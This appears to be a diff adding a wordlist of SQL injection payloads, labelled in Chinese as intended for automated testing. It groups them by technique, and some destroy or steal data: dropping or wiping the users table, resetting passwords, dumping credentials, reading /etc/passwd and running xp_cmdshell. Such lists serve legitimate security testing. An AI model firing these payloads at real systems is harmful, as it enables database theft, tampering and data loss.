@@ -1,0 +1,84 @@
+# SQL注入测试Payload
+# 每行一个payload，用于自动化测试
+
+# ==== 经典注入 ====
+1' OR '1'='1
+1' OR 1=1--
+1' OR '1'='1'--
+admin'--
+admin' #
+admin'/*
+
+# ==== Union注入 ====
+1' UNION SELECT NULL--
+1' UNION SELECT 1,2,3--
+1' UNION ALL SELECT NULL,NULL,NULL--
+-1' UNION SELECT username,password FROM users--
+' UNION SELECT @@version--
+
+# ==== 布尔盲注 ====
+1' AND '1'='1
+1' AND 1=1--
+1' AND 'a'='a
+' AND 1=1--
+' AND '1'='1'--
+
+# ==== 时间盲注 ====
+1' AND SLEEP(5)--
+1' OR SLEEP(5)--
+'; WAITFOR DELAY '00:00:05'--
+1'; SELECT PG_SLEEP(5)--
+1' AND BENCHMARK(5000000,MD5('test'))--
+
+# ==== 错误注入 ====
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
+' AND 1=UPDATEXML(1,CONCAT(0x7e,DATABASE()),1)--
+
+# ==== 堆叠查询 ====
+1'; DROP TABLE users--
+1'; DELETE FROM users--
+1'; UPDATE users SET password='hacked'--
+'; SELECT * FROM admin--
+
+# ==== 注释绕过 ====
+1'/**/OR/**/1=1--
+1'/*comment*/OR/*comment*/1=1--
+1'/*!UNION*//*!SELECT*/1,2,3--
+
+# ==== 编码绕过 ====
+1' AND CHAR(65)=CHAR(65)--
+1' UNION SELECT CHAR(117,115,101,114)--
+1' AND HEX('a')--
+
+# ==== 函数注入 ====
+1' UNION SELECT LOAD_FILE('/etc/passwd')--
+1' INTO OUTFILE '/tmp/test'--
+'; EXEC xp_cmdshell('dir')--
+1' UNION SELECT database()--
+1' UNION SELECT user()--
+1' UNION SELECT @@version--
+
+# ==== 二次注入 ====
+admin'),(2,'hacked','pass'))--
+test' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
+
+# ==== 宽字节注入 ====
+%df' OR 1=1--
+%bf' OR '1'='1
+
+# ==== 子查询 ====
+1' AND (SELECT COUNT(*) FROM users)>0--
+1' AND EXISTS(SELECT * FROM users)--
+1' AND (SELECT 1)=1--
+
+# ==== ORDER BY ====
+1' ORDER BY 10--
+1' ORDER BY 100--
+' ORDER BY 1--
+
+# ==== 信息收集 ====
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
+' UNION SELECT * FROM information_schema.schemata--
+
